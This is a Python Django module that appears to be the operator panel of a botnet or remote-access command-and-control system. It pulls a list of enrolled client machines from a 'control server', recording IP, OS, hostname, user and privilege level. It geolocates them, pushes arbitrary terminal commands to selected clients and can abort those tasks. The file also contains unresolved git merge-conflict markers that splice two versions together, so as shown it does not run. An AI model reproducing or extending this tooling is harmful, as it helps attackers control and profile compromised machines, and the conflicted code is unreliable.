<<<<<<< HEAD
from django.db.models import Count
from .models import Client
from decouple import config
import requests
from django.contrib.gis.geoip2 import GeoIP2 
=======
from .models import Client, SentTask
from decouple import config
import requests
import time
>>>>>>> 925e9f28affcc924cfdde72da999d905ee692534


class ControlServerHandler():
    url = ""
    prefix = ""
    authorization = ""
    errors = 0

    def __init__(self):
        self.url = config("CONTROL_SERVER_URL")
        self.prefix = config("CONTROL_SERVER_PREFIX")
        self.authorization = config("CONTROL_SERVER_AUTHORIZATION")

    def __save_clients(self, clients):
        saved_client_ids = list(Client.objects.values_list('client_id', flat=True))
        received_client_ids = [client['_id'] for client in clients]

        for saved_client in saved_client_ids:
            if saved_client not in received_client_ids:
                Client.objects.filter(client_id=saved_client).delete()

        for client in clients:
            if not (Client.objects.filter(client_id=client['_id']).exists()):
                client_data = client['client_data']
                c = Client(client_id=client['_id'],
                           ip=client['ip'],
                           os_name=client_data['os_name'],
                           os_version=client_data['os_version'],
                           hostname=client_data['hostname'],
                           host_user=client_data['host_user'],
                           privileges=client_data['privileges'])
                c.save()

    def getClients(self):
        requestUrl = "https://" + self.url + self.prefix + "/admin/allclients"
        requestHeaders = {'Authorization': self.authorization}
        r = requests.get(url=requestUrl, headers=requestHeaders)
        try:
            clients = r.json()['all_clients']
            self.__save_clients(clients)
            return clients
        except ValueError as e:
            print("Server issues" + str(e))
            return []
<<<<<<< HEAD
    
    def getStatistics(self):
        num_clients = Client.objects.all().count()
        top_os = Client.objects.annotate(c=Count('os_name')).order_by('-c').first().os_name
        statistics = {'num_clients': num_clients,
                      'top_os': top_os,
                      'errors': self.errors}
        return statistics
    
    def getLocations(self):
        g = GeoIP2()
        ips = list(Client.objects.values_list('ip', flat=True))
        # TODO: Remove dummy location in the future
        ips.append('72.14.207.99')
        coordinates = []

        for ip in ips:
            try:
                city = g.city(ip)
                lat = city['latitude']
                lon = city['longitude']
                coordinates.append([lat, lon])
            except Exception as e:
                print(e)

        return coordinates



=======

    def __saveTask(self, t_id, c_id, task_t, task_i, t_status):
        if task_t != 'abort':
            client = Client.objects.get(client_id=c_id)
            t = time.localtime()
            asc_t = time.asctime(t)
            client.senttask_set.create(task_id=t_id, start_time=asc_t, status=t_status,
                                       task_type=task_t, task_info=task_i)

    def getTasks(self):
        # TODO: Update when endpoint alltasks is implemented
        requestUrl = "https://" + self.url + self.prefix + "/admin/task"
        requestHeaders = {'Authorization': self.authorization}
        saved_client_ids = list(Client.objects.values_list('client_id', flat=True))

        for client in saved_client_ids:
            data = {
                "id": client,
            }
            response = requests.get(url=requestUrl, headers=requestHeaders, params=data)

            status_code = response.status_code
            if status_code == 200:
                pending_tasks = response.json()['pending_tasks']
                sent_tasks = response.json()['sent_tasks'][0]
                for task in pending_tasks:
                    t_id = task['_id']['task_id']
                    if not (SentTask.objects.filter(task_id=t_id).exists()):
                        c_id = task['_id']['client_id']
                        task_t = task['task']['name']
                        task_i = task['task']['data']
                        t_status = 'Pending'
                        self.__saveTask(t_id, c_id, task_t, task_i, t_status)
                for task in sent_tasks:
                    t_id = task['_id']['task_id']
                    if not (SentTask.objects.filter(task_id=t_id).exists()):
                        c_id = task['_id']['client_id']
                        task_t = task['task']['name']
                        task_i = task['task']['data']
                        t_status = task['status'].replace("_", " ")
                        self.__saveTask(t_id, c_id, task_t, task_i, t_status)
                    else:
                        SentTask.objects.filter(task_id=t_id).update(status=task['status'].replace("_", " "))

    def sendTasks(self, request):
        client_ids = request.POST.getlist('select')
        task_t = request.POST.getlist('option')[0]
        task_info = "..."
        if task_t == "Write command":
            task_info = request.POST.getlist('text')[0]
            task_info = task_info.replace('"', '\"')
            task_t = "terminal"
        elif task_t == "Open browser":
            task_info = "sensible-browser 'google.com'"

        client_ids_string = ", ".join(client_ids)
        requestUrl = "https://" + self.url + self.prefix + "/admin/task"
        requestHeaders = {'Authorization': self.authorization}

        data = {
            "client_id": client_ids_string,
            "data": task_info,
            "name": task_t,
            "min_delay": "500",
            "max_delay": "500"
        }

        response = requests.post(url=requestUrl, headers=requestHeaders, json=data)
        status_code = response.status_code
        if status_code == 200:
            print("Tasks sent")
        elif status_code == 400:
            print("No client IDs were given")
        elif status_code == 401:
            print("wrong authorization token")
        elif status_code == 404:
            print("One or more of the clients do not exist")
        else:
            print("Something went very wrong")

        return

    def killTask(self, request):
        selected = request.POST.getlist('select')
        task_ids = list(SentTask.objects.filter(id__in=selected).values_list('task_id', flat=True))
        selected_client_ids = list(SentTask.objects.filter(task_id__in=task_ids).values_list('client_id', flat=True))
        client_ids = list(Client.objects.filter(id__in=selected_client_ids).values_list('client_id', flat=True))

        requestUrl = "https://" + self.url + self.prefix + "/admin/task"
        requestHeaders = {'Authorization': self.authorization}

        client_ids_str = (', ').join(client_ids)
        task_ids_str = (', ').join(task_ids)

        data = {
            "client_id": client_ids_str,
            "data": task_ids_str,
            "name": "abort",
            "min_delay": "500",
            "max_delay": "500"
        }

        response = requests.post(url=requestUrl, headers=requestHeaders, json=data)
        status_code = response.status_code
        if status_code == 200:
            print("Tasks sent")
        elif status_code == 400:
            print("No client IDs were given")
        elif status_code == 401:
            print("wrong authorization token")
        elif status_code == 404:
            print("One or more of the clients do not exist")
        else:
            print("Something went very wrong")

        return
>>>>>>> 925e9f28affcc924cfdde72da999d905ee692534
